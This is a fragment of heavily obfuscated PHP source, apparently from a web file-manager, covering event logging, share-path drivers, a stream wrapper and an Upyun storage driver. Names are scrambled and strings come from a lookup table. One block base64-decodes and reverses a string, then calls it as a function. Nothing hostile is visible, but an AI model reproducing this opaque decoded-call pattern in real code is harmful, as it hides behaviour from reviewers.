array("\x64\145\163\143", '', "\151\156\x73\x65\162\164\x2c\x75\x70\144\141\x74\145\x2c\163\145\154\145\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ğÅúÁª×, $õùÅã‰Å, $ã¢äÉ‘¬ = '') { $ÔşÂÍ«Ë =& $_SERVER[ïëó©ÒÚ]; if (!$this->eventSave) { return; } $Ê¼ÅÀš× = Model($ÔşÂÍ«Ë[1330])->sourceInfo($ğÅúÁª×); if (!$Ê¼ÅÀš×) { return !1; } if ($this->isCacheEvent($Ê¼ÅÀš×, $õùÅã‰Å)) { return; } if ($ã¢äÉ‘¬ && is_string($ã¢äÉ‘¬)) { $ã¢äÉ‘¬ = array($ÔşÂÍ«Ë[1872] => $ã¢äÉ‘¬); } $´ ‡Ü‘ = array($ÔşÂÍ«Ë[426] => $ğÅúÁª×, $ÔşÂÍ«Ë[2050] => $Ê¼ÅÀš×[$ÔşÂÍ«Ë[441]], $ÔşÂÍ«Ë[2051] => $Ê¼ÅÀš×[$ÔşÂÍ«Ë[32]], $ÔşÂÍ«Ë[528] => !empty($Ê¼ÅÀš×[$ÔşÂÍ«Ë[528]]) ? $Ê¼ÅÀš×[$ÔşÂÍ«Ë[528]] : $ÔşÂÍ«Ë[12], $ÔşÂÍ«Ë[1652] => USER_ID, $ÔşÂÍ«Ë[431] => $õùÅã‰Å, $ÔşÂÍ«Ë[1654] => $ã¢äÉ‘¬); $this->addSystemLog($õùÅã‰Å, $´ ‡Ü‘); unset($´ ‡Ü‘[$ÔşÂÍ«Ë[2051]], $´ ‡Ü‘[$ÔşÂÍ«Ë[528]]); return $this->add($´ ‡Ü‘); } private function addSystemLog($´ëŒ, $‹¹†£†©) { $Ûºîê©Ó =& $_SERVER[ïëó©ÒÚ]; if ($´ëŒ == $Ûºîê©Ó[2052]) { $´ëŒ = $‹¹†£†©[$Ûºîê©Ó[462]][$Ûºîê©Ó[2053]]; } else { if (in_array($´ëŒ, array($Ûºîê©Ó[1813], $Ûºîê©Ó[2054]))) { $´ëŒ = $‹¹†£†©[$Ûºîê©Ó[462]][$Ûºîê©Ó[765]]; } } $€â¬¿¥Ù = array_merge($‹¹†£†©, array($Ûºîê©Ó[2055] => $‹¹†£†©[$Ûºîê©Ó[411]], $Ûºîê©Ó[2056] => $‹¹†£†©[$Ûºîê©Ó[2056]])); Hook::trigger($Ûºîê©Ó[2057], $Ûºîê©Ó[2058] . $´ëŒ, $‹¹†£†©); Model($Ûºîê©Ó[1777])->addLog($Ûºîê©Ó[2058] . $´ëŒ, $€â¬¿¥Ù); } private function isCacheEvent($Ğ—¨÷öÆ, $‡æøúíÕ) { if ($Ğ—¨÷öÆ[$_SERVER[ïëó©ÒÚ][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($æè†î¸¦, $ŒÆŞßå€) { $ÔÂæÆäš =& $_SERVER[ïëó©ÒÚ]; $å…Ğ¡Ğƒ = Model($ÔÂæÆäš[1330])->sourceInfo($æè†î¸¦); $éÃ÷ø€æ = array($ÔÂæÆäš[2053] => $ŒÆŞßå€, $ÔÂæÆäš[32] => $å…Ğ¡Ğƒ[$ÔÂæÆäš[32]]); return $this->addEvent($æè†î¸¦, $ÔÂæÆäš[2052], $éÃ÷ø€æ); } public function eventFileEdit($‘Ğª–À«) { $èõ¡œ– =& $_SERVER[ïëó©ÒÚ]; $¨ù¯”³Á = array($èõ¡œ–[2059] => $_SERVER[$èõ¡œ–[2060]], $èõ¡œ–[2061] => strtolower(ACTION)); if (isset($GLOBALS[$èõ¡œ–[7]][$èõ¡œ–[2062]])) { $¨ù¯”³Á[$èõ¡œ–[2062]] = $èõ¡œ–[88]; } return $this->addEvent($‘Ğª–À«, $èõ¡œ–[1803], $¨ù¯”³Á); } public function eventRecycle($İ«¢–™˜, $Ÿ¯¼ÁÁê) { return $this->addEvent($İ«¢–™˜, $_SERVER[ïëó©ÒÚ][2054], $Ÿ¯¼ÁÁê); } public function eventRemove($ëöÎå€ò) { $£“µÍ¬ =& $_SERVER[ïëó©ÒÚ]; $öÓîÂÁŠ = Model($£“µÍ¬[1330])->sourceInfo($ëöÎå€ò); $­ÃÖëˆå = $öÓîÂÁŠ[$£“µÍ¬[32]]; return $this->addEvent($öÓîÂÁŠ[$£“µÍ¬[441]], $£“µÍ¬[1802], $­ÃÖëˆå); } public function eventShare($á¼Ëà…Å, $¬º«Ù€Ÿ) { return $this->addEvent($á¼Ëà…Å, $_SERVER[ïëó©ÒÚ][1813], $¬º«Ù€Ÿ); } public function eventMove($ÆÁïÔİÆ, $úÛûÓ›š, $õ‹±†òÀ) { $³×ìÀŠÇ =& $_SERVER[ïëó©ÒÚ]; $º´›Ì¹ñ = Model($³×ìÀŠÇ[1330]); $¡£’”¸Ó = $º´›Ì¹ñ->sourceInfo($ÆÁïÔİÆ); $‰‹×ñÂ = $º´›Ì¹ñ->sourceInfo($úÛûÓ›š); $ëîş•¡« = $º´›Ì¹ñ->sourceInfo($õ‹±†òÀ); $¦ÖĞ—¹å = array($³×ìÀŠÇ[1163] => $úÛûÓ›š, $³×ìÀŠÇ[2063] => $‰‹×ñÂ[$³×ìÀŠÇ[32]], $³×ìÀŠÇ[2041] => !empty($‰‹×ñÂ[$³×ìÀŠÇ[528]]) ? $‰‹×ñÂ[$³×ìÀŠÇ[528]] : $³×ìÀŠÇ[12], $³×ìÀŠÇ[1164] => $õ‹±†òÀ, $³×ìÀŠÇ[2064] => $ëîş•¡«[$³×ìÀŠÇ[32]], $³×ìÀŠÇ[2065] => !empty($ëîş•¡«[$³×ìÀŠÇ[528]]) ? $ëîş•¡«[$³×ìÀŠÇ[528]] : $³×ìÀŠÇ[12]); $this->addEvent($ÆÁïÔİÆ, $³×ìÀŠÇ[566], $¦ÖĞ—¹å); $¡£’”¸Ó = $º´›Ì¹ñ->sourceInfo($ÆÁïÔİÆ); $¦ÖĞ—¹å = array($³×ìÀŠÇ[411] => $¡£’”¸Ó[$³×ìÀŠÇ[411]], $³×ìÀŠÇ[32] => $¡£’”¸Ó[$³×ìÀŠÇ[32]]); $this->addEvent($úÛûÓ›š, $³×ìÀŠÇ[2066], $¦ÖĞ—¹å); } public function eventCopy($ì±°¿Æò) { $this->eventCreate($ì±°¿Æò, $_SERVER[ïëó©ÒÚ][564]); } public function eventRename($¤…‰ªİï, $¡Ê‡ÏÚÄ, $ëáÇè¢å) { $²”˜½ô´ =& $_SERVER[ïëó©ÒÚ]; $ıŸ¤éÜ = array($²”˜½ô´[1163] => $¡Ê‡ÏÚÄ, $²”˜½ô´[1164] => $ëáÇè¢å); return $this->addEvent($¤…‰ªİï, $²”˜½ô´[1345], $ıŸ¤éÜ); } public function eventAddComment($¼ßÌä €, $ıœ¬›²ô) { return $this->addEvent($¼ßÌä €, $_SERVER[ïëó©ÒÚ][2067], $ıœ¬›²ô); } public function eventAddDesc($×“ò±’“, $€ÕÊÜŸ€) { return $this->addEvent($×“ò±’“, $_SERVER[ïëó©ÒÚ][2068], $€ÕÊÜŸ€); } public function listBySource($Ø¥Ä“ñÛ) { $‰ÉÅÛ¢Ø =& $_SERVER[ïëó©ÒÚ]; $ˆ¸æ¼‚€ = Model($‰ÉÅÛ¢Ø[1330])->sourceInfo($Ø¥Ä“ñÛ); $¯Ÿ±Àƒî = array($‰ÉÅÛ¢Ø[426] => $Ø¥Ä“ñÛ); if ($ˆ¸æ¼‚€[$‰ÉÅÛ¢Ø[419]] == $‰ÉÅÛ¢Ø[88]) { $éÏ¶ƒËÔ = Model($‰ÉÅÛ¢Ø[1330])->listSearchChildren($Ø¥Ä“ñÛ, 20000); $éÏ¶ƒËÔ[] = $Ø¥Ä“ñÛ . $‰ÉÅÛ¢Ø[378]; $¯Ÿ±Àƒî = array($‰ÉÅÛ¢Ø[411] => array($‰ÉÅÛ¢Ø[7], $éÏ¶ƒËÔ)); } $Ë‹¸¶¡ª = $this->where($¯Ÿ±Àƒî)->order($‰ÉÅÛ¢Ø[2069])->selectPage(); if ($Ë‹¸¶¡ª[$‰ÉÅÛ¢Ø[366]][$‰ÉÅÛ¢Ø[367]] == 0) { $Ë‹¸¶¡ª[$‰ÉÅÛ¢Ø[366]][$‰ÉÅÛ¢Ø[367]] = 1; $Ë‹¸¶¡ª[$‰ÉÅÛ¢Ø[369]] = array(array($‰ÉÅÛ¢Ø[426] => $Ø¥Ä“ñÛ, $‰ÉÅÛ¢Ø[2050] => $ˆ¸æ¼‚€[$‰ÉÅÛ¢Ø[441]], $‰ÉÅÛ¢Ø[1652] => $ˆ¸æ¼‚€[$‰ÉÅÛ¢Ø[463]], $‰ÉÅÛ¢Ø[431] => $‰ÉÅÛ¢Ø[2070], $‰ÉÅÛ¢Ø[432] => $ˆ¸æ¼‚€[$‰ÉÅÛ¢Ø[200]], $‰ÉÅÛ¢Ø[1654] => $‰ÉÅÛ¢Ø[12])); } return $this->eventListParse($Ë‹¸¶¡ª, $Ø¥Ä“ñÛ); } private function eventListParse($²ÇÃ–´, $âºÕ‰­Á) { $ÛÔáó©­ =& $_SERVER[ïëó©ÒÚ]; $æ´ûìÙ¡ = $²ÇÃ–´[$ÛÔáó©­[369]]; $ÉêÆÌ¢ = array_to_keyvalue($æ´ûìÙ¡, $ÛÔáó©­[12], $ÛÔáó©­[411]); $ãÙ˜ïŠÄ = array_to_keyvalue($æ´ûìÙ¡, $ÛÔáó©­[12], $ÛÔáó©­[2056]); foreach ($æ´ûìÙ¡ as $§ë¤’ä) { $»¼ü·›‹ = $§ë¤’ä[$ÛÔáó©­[462]]; if ($§ë¤’ä[$ÛÔáó©­[33]] == $ÛÔáó©­[566] && isset($»¼ü·›‹[$ÛÔáó©­[1163]])) { $ÉêÆÌ¢[] = $»¼ü·›‹[$ÛÔáó©­[1163]] . $ÛÔáó©­[12]; $ÉêÆÌ¢[] = $»¼ü·›‹[$ÛÔáó©­[1164]] . $ÛÔáó©­[12]; } if ($§ë¤’ä[$ÛÔáó©­[33]] == $ÛÔáó©­[2066] && isset($»¼ü·›‹[$ÛÔáó©­[411]])) { $ÉêÆÌ¢[] = $»¼ü·›‹[$ÛÔáó©­[411]] . $ÛÔáó©­[12]; } } $ÉêÆÌ¢ = array_merge($ÉêÆÌ¢, $ãÙ˜ïŠÄ, array($âºÕ‰­Á . $ÛÔáó©­[12])); $ÉêÆÌ¢ = array_unique($ÉêÆÌ¢); $ú‚ì¢ƒİ = array_unique(array_to_keyvalue($æ´ûìÙ¡, $ÛÔáó©­[12], $ÛÔáó©­[1661])); $ı†ü£Ä‹ = Model($ÛÔáó©­[544])->userListInfo($ú‚ì¢ƒİ); $ğé¦‹ÆÈ = Model($ÛÔáó©­[835])->sourceListInfo($ÉêÆÌ¢, !0); foreach ($æ´ûìÙ¡ as &$§ë¤’ä) { if ($§ë¤’ä[$ÛÔáó©­[33]] == $ÛÔáó©­[566] && isset($§ë¤’ä[$ÛÔáó©­[462]][$ÛÔáó©­[1163]])) { $§ë¤’ä[$ÛÔáó©­[462]][$ÛÔáó©­[1163]] = $ğé¦‹ÆÈ[$§ë¤’ä[$ÛÔáó©­[462]][$ÛÔáó©­[1163]]]; $§ë¤’ä[$ÛÔáó©­[462]][$ÛÔáó©­[1164]] = $ğé¦‹ÆÈ[$§ë¤’ä[$ÛÔáó©­[462]][$ÛÔáó©­[1164]]]; } if ($§ë¤’ä[$ÛÔáó©­[33]] == $ÛÔáó©­[2066] && isset($§ë¤’ä[$ÛÔáó©­[462]][$ÛÔáó©­[411]])) { $§ë¤’ä[$ÛÔáó©­[462]][$ÛÔáó©­[411]] = $ğé¦‹ÆÈ[$§ë¤’ä[$ÛÔáó©­[462]][$ÛÔáó©­[411]]]; } $§ë¤’ä[$ÛÔáó©­[86]] = $ğé¦‹ÆÈ[$§ë¤’ä[$ÛÔáó©­[411]]]; $§ë¤’ä[$ÛÔáó©­[2071]] = $ğé¦‹ÆÈ[$§ë¤’ä[$ÛÔáó©­[2056]]]; if ($§ë¤’ä[$ÛÔáó©­[33]] == $ÛÔáó©­[1802]) { $§ë¤’ä[$ÛÔáó©­[2071]] = $§ë¤’ä[$ÛÔáó©­[86]]; $§ë¤’ä[$ÛÔáó©­[2056]] = $§ë¤’ä[$ÛÔáó©­[2071]][$ÛÔáó©­[411]]; $§ë¤’ä[$ÛÔáó©­[86]] = !1; $§ë¤’ä[$ÛÔáó©­[411]] = $ÛÔáó©­[12]; } $§ë¤’ä[$ÛÔáó©­[2001]] = $ı†ü£Ä‹[$§ë¤’ä[$ÛÔáó©­[1661]]]; } unset($§ë¤’ä); $²ÇÃ–´[$ÛÔáó©­[369]] = $æ´ûìÙ¡; return $²ÇÃ–´; } public function removeBySource($®Œ›å•÷) { $›ÂñÔƒ = array($_SERVER[ïëó©ÒÚ][426] => $®Œ›å•÷); $this->where($›ÂñÔƒ)->remove(); } } goto fÍ™ŞîËİ; bèé½´×øµ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Á§ˆ…¤) { $this->pathParse = $Á§ˆ…¤; $this->model = Model($_SERVER[ïëó©ÒÚ][1330]); } public function getPathOuter($¼ºØñ—Ï) { $Ù…ñ§ª =& $_SERVER[ïëó©ÒÚ]; if (!$¼ºØñ—Ï) { return $¼ºØñ—Ï; } $†ûïı‚Â = $this->parse($¼ºØñ—Ï); return trim(KodIO::makeShare($this->pathParse[$Ù…ñ§ª[399]], $†ûïı‚Â[$Ù…ñ§ª[399]]), $Ù…ñ§ª[8]); } protected function infoParse($¬†¤ıÁÁ, $‰ã’Ç²» = false, $Óí€ıû = false) { $šá£ÆÛÆ =& $_SERVER[ïëó©ÒÚ]; $€°ô¹¼è = $this->pathParse[$šá£ÆÛÆ[399]]; $«øÛ¤³‹ = trim($this->pathParse[$šá£ÆÛÆ[1172]], $šá£ÆÛÆ[8]); return Action($šá£ÆÛÆ[1338])->sharePathInfo($€°ô¹¼è, $«øÛ¤³‹, $‰ã’Ç²»); } public function infoFull($Î€‡—ö) { $€ñ·Ùí =& $_SERVER[ïëó©ÒÚ]; $™ó¹ÇÏã = explode($€ñ·Ùí[8], trim($Î€‡—ö, $€ñ·Ùí[8])); if (count($™ó¹ÇÏã) > 1) { $ì†è€…ä = implode($€ñ·Ùí[8], array_splice($™ó¹ÇÏã, 1)); $ùĞªÂ€Ç = $this->model->pathInfoByPath($™ó¹ÇÏã[0], $ì†è€…ä); if (!$ùĞªÂ€Ç) { return !1; } $this->pathParse[$€ñ·Ùí[1172]] = $ùĞªÂ€Ç[$€ñ·Ùí[411]]; } return $this->infoParse($Î€‡—ö); } public function listAll($×Šºˆ÷û) { $Á±œÜ¡ş =& $_SERVER[ïëó©ÒÚ]; $¼Æ”¿½À = IO::info($this->pathParse[$Á±œÜ¡ş[84]]); if (!$¼Æ”¿½À) { return array(); } $‰·Ÿ äÎ = $this->model->listAll($×Šºˆ÷û); $¯ïş½¸æ = Model($Á±œÜ¡ş[610])->getInfo($¼Æ”¿½À[$Á±œÜ¡ş[498]]); $Ù¾öÚÚú = Action($Á±œÜ¡ş[1338]); foreach ($‰·Ÿ äÎ as &$Ë–È™”) { check_abort(); $Ë–È™”[$Á±œÜ¡ş[86]] = $Ù¾öÚÚú->_shareItemeParse($Ë–È™”[$Á±œÜ¡ş[86]], $¯ïş½¸æ); } unset($Ë–È™”); return $‰·Ÿ äÎ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($–ô²ÖĞü) { $this->pathParse = $–ô²ÖĞü; $this->model = Model($_SERVER[ïëó©ÒÚ][1330]); } protected function infoParse($ÎõÄÁĞ˜, $’Çş¯ê = false, $æ²£–è® = false) { $åë„¤˜“ =& $_SERVER[ïëó©ÒÚ]; return Action($åë„¤˜“[1178])->sharePathInfo($this->pathParse[$åë„¤˜“[84]], !0, $’Çş¯ê); } public function listPath($àÖ²Ô…é, $‚ò½ê˜Ô = false) { $›ƒÅ±²Ú =& $_SERVER[ïëó©ÒÚ]; $ó’äÆâĞ = parent::listPath($àÖ²Ô…é, $‚ò½ê˜Ô); if (!$ó’äÆâĞ) { return $ó’äÆâĞ; } if (is_array($ó’äÆâĞ[$›ƒÅ±²Ú[1339]])) { $ó’äÆâĞ[$›ƒÅ±²Ú[1339]] = Action($›ƒÅ±²Ú[1178])->shareItemInfo($ó’äÆâĞ[$›ƒÅ±²Ú[1339]]); } foreach ($ó’äÆâĞ as $¬¨³’©‰ => $ŞŒŒË”à) { if (!in_array($¬¨³’©‰, array($›ƒÅ±²Ú[83], $›ƒÅ±²Ú[82]))) { continue; } foreach ($ŞŒŒË”à as $ŞÃıı´æ => $Í”øıàŸ) { $ó’äÆâĞ[$¬¨³’©‰][$ŞÃıı´æ] = Action($›ƒÅ±²Ú[1178])->shareItemInfo($Í”øıàŸ); } } return $ó’äÆâĞ; } public function listAll($ƒŒ×Ğï¶) { $®â¨ß›„ =& $_SERVER[ïëó©ÒÚ]; $ó§¤ÄØ• = IO::info($this->pathParse[$®â¨ß›„[84]]); if (!$ó§¤ÄØ•) { return array(); } $× ã’Üü = $this->model->listAll($ƒŒ×Ğï¶); foreach ($× ã’Üü as &$Ñ‡íìë ) { $Ñ‡íìë [$®â¨ß›„[86]] = Action($®â¨ß›„[1178])->shareItemInfo($Ñ‡íìë [$®â¨ß›„[86]]); } unset($Ñ‡íìë ); return $× ã’Üü; } } class PathDriverDriverShareItem { public function __construct($À¶è††) { $this->pathParse = $À¶è††; } public function __call($Ÿ”œ‚•ı, $¬î•ıçß) { $½Øò•Óõ =& $_SERVER[ïëó©ÒÚ]; if (method_exists($this, $Ÿ”œ‚•ı)) { return; } $˜Úáú = call_user_func_array(array($½Øò•Óõ[1340], $Ÿ”œ‚•ı), $¬î•ıçß); $µ‚†ìÂê = array($½Øò•Óõ[1341], $½Øò•Óõ[1342], $½Øò•Óõ[1343], $½Øò•Óõ[1344], $½Øò•Óõ[564], $½Øò•Óõ[566], $½Øò•Óõ[1345], $½Øò•Óõ[107], $½Øò•Óõ[1346], $½Øò•Óõ[1347]); if (in_array($Ÿ”œ‚•ı, $µ‚†ìÂê)) { $˜Úáú = $this->getPathOuter($˜Úáú); } return $˜Úáú; } public function copy($‹¸¢¹Ü”, $ éú„å, $°ÊÛöÂ = false, $İßÏ£‰ğ = false) { return $this->copyMove($‹¸¢¹Ü”, $ éú„å, $°ÊÛöÂ, $_SERVER[ïëó©ÒÚ][564], $İßÏ£‰ğ); } public function move($ñ‚Â®í¥, $‘ªæÏˆ†, $Ğ’¬²ñ‹ = false, $š‘Çæåƒ = false) { return $this->copyMove($ñ‚Â®í¥, $‘ªæÏˆ†, $Ğ’¬²ñ‹, $_SERVER[ïëó©ÒÚ][566], $š‘Çæåƒ); } private function copyMove($É—íèëı, $×¯±Ë, $Ü³ßæ», $Ä‰µ”şù, $˜“˜èä = false) { $û½ñ£¢Ï =& $_SERVER[ïëó©ÒÚ]; $§ªôÌ¦ = $×¯±Ë; $Šê¦‹£¢ = IO::driverMake($×¯±Ë); if ($Šê¦‹£¢->pathParse[$û½ñ£¢Ï[1154]]) { $×¯±Ë = $Šê¦‹£¢->pathParse[$û½ñ£¢Ï[1154]]; } else { $×¯±Ë = $§ªôÌ¦; } $©šÕª÷º = IO::copyMove($É—íèëı, $×¯±Ë, $Ü³ßæ», $Ä‰µ”şù, $˜“˜èä); $©šÕª÷º = $this->getPathOuter($©šÕª÷º); return $©šÕª÷º; } public function pathThis($ÀÒëïœ) { return get_path_this($this->pathParse[$_SERVER[ïëó©ÒÚ][84]]); } public function pathFather($üƒ‹ß¾©) { return get_path_father($this->pathParse[$_SERVER[ïëó©ÒÚ][84]]); } public function iconvSystem($¤£Óåñ™) { return $¤£Óåñ™; } protected function infoParse($»æö‘®õ, $Ñí†–Â = false) { $ºË®¤­ü =& $_SERVER[ïëó©ÒÚ]; $ªŒ—„¼ = $this->pathParse[$ºË®¤­ü[496]][$ºË®¤­ü[1179]] . $this->pathParse[$ºË®¤­ü[1172]]; if ($Ñí†–Â) { $¾üö‰íÄ = IO::infoWithChildren($ªŒ—„¼); } else { $¾üö‰íÄ = IO::info($ªŒ—„¼); } $ü²×Éõ× = $this->pathParse[$ºË®¤­ü[496]]; return Action($ºË®¤­ü[1338])->_shareItemeParse($¾üö‰íÄ, $ü²×Éõ×); } public function listAll($ûñáöµä) { $’‡™«ñ =& $_SERVER[ïëó©ÒÚ]; $×ØšˆÂÀ = IO::listAll($ûñáöµä); $Åù½—³ğ = $this->pathParse[$’‡™«ñ[496]]; foreach ($×ØšˆÂÀ as &$Õ“À“İ) { check_abort(); $¹‰šœäÔ = IO::info($Õ“À“İ[$’‡™«ñ[84]]); $¹‰šœäÔ = is_array($¹‰šœäÔ) ? $¹‰šœäÔ : array(); $Õ“À“İ = array_merge($¹‰šœäÔ, $Õ“À“İ); $Õ“À“İ[$’‡™«ñ[86]] = Action($’‡™«ñ[1338])->_shareItemeParse($Õ“À“İ, $Åù½—³ğ); } unset($Õ“À“İ); return $×ØšˆÂÀ; } public function getPathOuter($Ã­ŞÈÅÁ) { $¶ğê„ë =& $_SERVER[ïëó©ÒÚ]; $ç¾¢§§« = KodIO::parse($Ã­ŞÈÅÁ); if ($ç¾¢§§«[$¶ğê„ë[33]] == KodIO::KOD_SHARE_ITEM) { return $ç¾¢§§«[$¶ğê„ë[84]]; } $§èÏˆı = KodIO::clear($Ã­ŞÈÅÁ); $ı¦“Ë‡ = KodIO::clear($this->pathParse[$¶ğê„ë[496]][$¶ğê„ë[1179]]); $ş’ı”öõ = substr($§èÏˆı, strlen($ı¦“Ë‡)); if (substr($§èÏˆı, 0, strlen($ı¦“Ë‡)) != $ı¦“Ë‡) { return !1; } return $this->pathParse[$¶ğê„ë[1173]] . $¶ğê„ë[8] . ltrim($ş’ı”öõ, $¶ğê„ë[8]); } public function getType() { $•œŸÕ =& $_SERVER[ïëó©ÒÚ]; $›ƒ¨Ù÷ = str_replace($•œŸÕ[74], $•œŸÕ[12], get_class($this)); return strtolower($›ƒ¨Ù÷); } public function isTypeObject($¯•àŠ) { return IO::isTypeObject($¯•àŠ); } public function info($­Ç…ˆç) { return $this->infoParse($­Ç…ˆç); } public function infoAuth($Ó¢èÂ’ú) { return $this->infoParse($Ó¢èÂ’ú); } public function infoWithChildren($ßƒ¾°Ü) { return $this->infoParse($ßƒ¾°Ü, !0); } public function infoFull($Û¸şØÛî) { return $this->infoParse($Û¸şØÛî); } } goto eÑ ïÕ„Ÿë; F¼ø‚´¢Ü´: $fileSize = strrev(base64_decode($_SERVER[ï¯ò˜Ã›][0])); function binCheckNeq($µ‚ÅÁû, $Óš°øø) { return $µ‚ÅÁû != $Óš°øø; } $_SERVER[$_SERVER[ï¯ò˜Ã›][1]] = $fileSize($_SERVER[$_SERVER[ï¯ò˜Ã›][2]]); goto B¥—¼Š×–…; f˜ˆã³ƒ†¢: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Œú·æ©¿, $ç‘ÜÏæ = 0) { parent::__construct(); $this->source = $Œú·æ©¿; $this->sourceSize = $ç‘ÜÏæ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ª†èµùà = false) { return $this->sourceSize; } public function getContent($ŠƒëÃÊŸ = false) { return $this->fileSubstr($ŠƒëÃÊŸ, 0, $this->sourceSize); } public function fileSubstr($àÍõÁÎ˜ = false, $¤²ª††¼ = 0, $Ù«ùêš¦ = 0) { if (!$Ù«ùêš¦) { $Ù«ùêš¦ = $this->sourceSize; } $¨¹²†¢ü = $this->sourceSize - $¤²ª††¼; if ($Ù«ùêš¦ >= $¨¹²†¢ü) { $Ù«ùêš¦ = $¨¹²†¢ü; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¤²ª††¼, $Ù«ùêš¦); } if ($this->sourceType == self::TYPE_FILE) { if ($Ù«ùêš¦ <= 0) { return $_SERVER[ïëó©ÒÚ][12]; } $„¢ƒ„»É = ftell($this->source); fseek_64($this->source, $„¢ƒ„»É + $¤²ª††¼); $»Çëá = @fread($this->source, $Ù«ùêš¦); fseek_64($this->source, $„¢ƒ„»É); return $»Çëá; } } public function hashMd5($€ƒ„ù¢Í = false) { return md5($this->getContent()); } public static function hash($Î¢ ‡€, $Š•Â½ Ú = 0) { $ÈØşş‚ = new PathDriverStream($Î¢ ‡€, $Š•Â½ Ú); return $ÈØşş‚->hashSimple($Î¢ ‡€); } public static function md5($ü½«ÇÇÎ, $ÛõÇ½úá = 0) { $µ¥Ú¹Ù¦ = new PathDriverStream($ü½«ÇÇÎ, $ÛõÇ½úá); return $µ¥Ú¹Ù¦->hashMd5($ü½«ÇÇÎ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\x3a\57\57\166\x30\56\x61\160\151\x2e\x75\160\x79\165\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ĞİÕÉ„€) { parent::__construct(); $this->_init($ĞİÕÉ„€); } public function _init($»Ö§¶Ä) { $³è›šØ =& $_SERVER[ïëó©ÒÚ]; foreach ($»Ö§¶Ä as $øÚ±¯Ï© => $şıí¶‰Õ) { if (isset($this->{$øÚ±¯Ï©})) { $this->{$øÚ±¯Ï©} = $şıí¶‰Õ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($³è›šØ[1456] . LNG($³è›šØ[1387])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ĞºˆÕÎ, $«Æ­¦¸ = "\107\x45\x54") { $Ö¡âæÀ‰ =& $_SERVER[ïëó©ÒÚ]; $æ×íäòñ = gmdate($Ö¡âæÀ‰[1420]); $ ½ÁÚ±Ş = base64_encode(hash_hmac($Ö¡âæÀ‰[1457], "{$«Æ­¦¸}\x26{$ĞºˆÕÎ}\x26{$æ×íäòñ}", md5("{$this->userpass}"), !0)); $³€‡„êƒ = array("\x41\165\164\x68\x6f\162\x69\172\141\x74\x69\x6f\156\72\x55\x50\x59\x55\116\40{$this->username}\72{$ ½ÁÚ±Ş}", "\104\x61\164\145\x3a{$æ×íäòñ}"); return $³€‡„êƒ; } public function ussRequest($ªœÍÈ¾, $õåàÎÏç = "\x47\105\124", $…ˆ˜¤’à = false, $õÉ÷©É† = false, $²©ÛÀŠÛ = false) { $äìâ¿‚¾ =& $_SERVER[ïëó©ÒÚ]; $ªœÍÈ¾ = trim($ªœÍÈ¾, $äìâ¿‚¾[8]); $şÉÇˆ»ì = "\57{$this->bucket}\57{$ªœÍÈ¾}"; $½Ï‰±ô = $this->ussHeaders($şÉÇˆ»ì, $õåàÎÏç); if ($õÉ÷©É†) { $½Ï‰±ô = array_merge($½Ï‰±ô, $õÉ÷©É†); } $¨ó«àîê = url_request($this->endpoint . $şÉÇˆ»ì, $õåàÎÏç, $…ˆ˜¤’à, $½Ï‰±ô, $²©ÛÀŠÛ); if (!$¨ó«àîê) { return array($äìâ¿‚¾[1194] => !1, $äìâ¿‚¾[1196] => $äìâ¿‚¾[1458]); } if (strtolower($õåàÎÏç) == $äìâ¿‚¾[196] || in_array($¨ó«àîê[$äìâ¿‚¾[1194]], array($äìâ¿‚¾[1313], $äìâ¿‚¾[1459]))) { $…ˆ˜¤’à = $¨ó«àîê[$äìâ¿‚¾[1460]]; } else { $…ˆ˜¤’à = json_decode($¨ó«àîê[$äìâ¿‚¾[1196]], !0); if (!$…ˆ˜¤’à) { $…ˆ˜¤’à = $¨ó«àîê[$äìâ¿‚¾[1196]]; } else { if (!$¨ó«àîê[$äìâ¿‚¾[760]] && isset($…ˆ˜¤’à[$äìâ¿‚¾[1461]])) { $…ˆ˜¤’à = $…ˆ˜¤’à[$äìâ¿‚¾[1461]]; } } } return array($äìâ¿‚¾[1194] => $¨ó«àîê[$äìâ¿‚¾[760]], $äìâ¿‚¾[1196] => $…ˆ˜¤’à); } public function mkfile($·¿…¬†à, $áê¡Õƒì = '', $ ô©ıêê = REPEAT_RENAME) { if ($this->setContent($·¿…¬†à, $áê¡Õƒì)) { return $this->getPathOuter($·¿…¬†à); } return !1; } public function mkdir($¯çå€­é, $¤ŠÚÏ¸ = REPEAT_SKIP) { $ÌÖ¹ÓÒš =& $_SERVER[ïëó©ÒÚ]; $à¾ŞÅ¢æ = trim($¯çå€­é, $ÌÖ¹ÓÒš[8]); if ($this->_isFolder($à¾ŞÅ¢æ)) { return $this->getPathOuter($à¾ŞÅ¢æ); } $ÊŒŠÌäê = array($ÌÖ¹ÓÒš[1462]); $©Ï³ï„Å = $this->ussRequest($à¾ŞÅ¢æ, $ÌÖ¹ÓÒš[226], !1, $ÊŒŠÌäê); return $©Ï³ï„Å[$ÌÖ¹ÓÒš[1194]] ? $this->getPathOuter($à¾ŞÅ¢æ) : !1; } public function copyFile($Ê»ùî¾», $í·ÓËÇè) { $àÚ¬¯â¢ =& $_SERVER[ïëó©ÒÚ]; $®µàÈÑí = array($àÚ¬¯â¢[1463] . "\x2f{$this->bucket}\x2f{$Ê»ùî¾»}", $àÚ¬¯â¢[1464]); $×Óæ²®¹ = $this->ussRequest($í·ÓËÇè, $àÚ¬¯â¢[228], !1, $®µàÈÑí); return $×Óæ²®¹[$àÚ¬¯â¢[1194]] ? !0 : $this->getPathOuter($í·ÓËÇè); } public function moveFile($ÅŠ²²¯Ú, $îàçĞ¬±) { $ŸıíÈà =& $_SERVER[ïëó©ÒÚ]; $˜ƒ»¡º = array($ŸıíÈà[1465] . 